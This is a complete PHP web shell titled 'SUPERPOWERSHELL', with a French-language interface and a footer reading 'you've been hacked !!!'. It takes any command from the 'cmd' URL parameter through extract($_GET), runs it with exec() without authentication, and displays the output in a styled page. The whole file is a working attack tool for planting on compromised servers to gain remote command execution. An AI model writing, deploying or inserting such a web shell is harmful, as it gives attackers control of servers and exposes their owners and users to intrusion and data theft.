<?php
    extract($_GET);
    $cmd = $cmd ? $cmd : "ls ~/";
    $output = [];
    $result_code = null;
    exec($cmd, $output,$result_code);
?>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SUPERPOWERSHELL By X</title>
</head>
<body>
    <style>
        body{
            background:#111;
            color:cyan;
            margin:0;
            padding:0;
            width:100vw;
            min-height:100vh;
        }
        #shell{
            display:flex;
            flex-direction:column;
            height:100%;
        }
        #shelltitle{
            background:#222b;
            height:10%;
            margin:0;
            padding:1%;
            display:flex;
            flex-direction:column;
            justify-content:center;
        }
        #shelldata{
            display:flex;
            flex-direction:column;
            height:80%;
            min-height:80%;
        }
        #shelldata>*{
            padding:1%;
        }
        #data{
            display:flex;
            flex-direction:column;
            max-height:75%;
            min-height:75%;
            overflow:hidden;
            overflow-y:scroll;
        }
        form input{
            width:90%;
        }
        form >*{
            padding:0.5%;
        }   
        #shellfooter{
            text-align:center;
            padding:0.5%;
        }
        .line{
            display:flex;
            padding:0.5%;
            margin:0.5;
            background:#222b;
        }
        .linenumber{
            display: flex;
            width:2.5%;
        }
        .content{
            padding:0.5%;
        }
    </style>
    <section id='shell'>
        <h2 id='shelltitle'>
            <?php echo "superpowershell 0.1 ~ resultats de la commande $cmd" ?>
        </h2>
        <div id='shelldata'>
            <div id='data'>
                <?php
                    foreach($output as $k => $line){
                        ?>
                            <div class="line">
                                <span class='linenumber'>
                                    <?php
                                        echo $k+1;                                
                                    ?>
                                </span>
                                <span class='content'>
                                    <?php
                                        echo $line;                                
                                    ?>
                                </span>
                            </div>
                        <?php
                    }
                ?>
            </div>
            <form>
                <input type="text" name="cmd">
                <button>
                    executer
                </button>
            </form>
            <div id='result_code'>
                <?php
                    echo "command status $result_code";
                ?>
            </div>
        </div>
        <div id='shellfooter'>
            nocopyrights dev0ps221 2022 - you've been hacked !!!
        </div>
    </section>
    
</body>
</html>